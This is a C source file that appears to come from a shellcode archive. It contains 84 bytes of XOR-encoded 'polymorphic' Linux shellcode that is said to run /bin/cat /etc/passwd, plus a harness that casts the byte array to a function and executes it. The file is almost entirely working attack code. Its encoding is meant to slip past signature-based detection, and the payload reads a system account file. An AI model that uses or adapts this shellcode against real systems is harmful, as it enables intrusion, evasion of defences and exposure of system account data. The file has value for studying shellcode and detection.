/*
 * sys_execve("/bin/cat", { "/bin/cat", "/etc/passwd" }, NULL) 84 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char encoded_passwd[] = "\xeb\x0d\x5e\x31\xc9\xb1\x40\x80\x36\x1c"
			"\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
			"\x2d\xdc\xac\x0b\xd1\x9c\x9f\xf0\x1d\x94"
			"\x18\x38\x74\x6f\x6f\x6b\x78\x74\x7f\x33"
			"\x6c\x7d\x74\x33\x33\x79\x68\x95\xfa\x9f"
			"\xf0\x1d\x94\x18\x38\x74\x33\x7f\x7d\x68"
			"\x74\x33\x7e\x75\x72\x95\xff\x2d\xdc\x4c"
			"\x4a\x4f\xac\x17\x95\xfd\xd1\x9c\x2d\xdc"
			"\xac\x1d\xd1\x9c";

int main(void)
{
	int pass_len = strlen(encoded_passwd);
	printf("[+] Using mutation key engine : 0x1c\n");
	printf("[+] Length of this shellcode is : %d bytes\n\n", pass_len);
	(*(void(*)())encoded_passwd)();
	return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */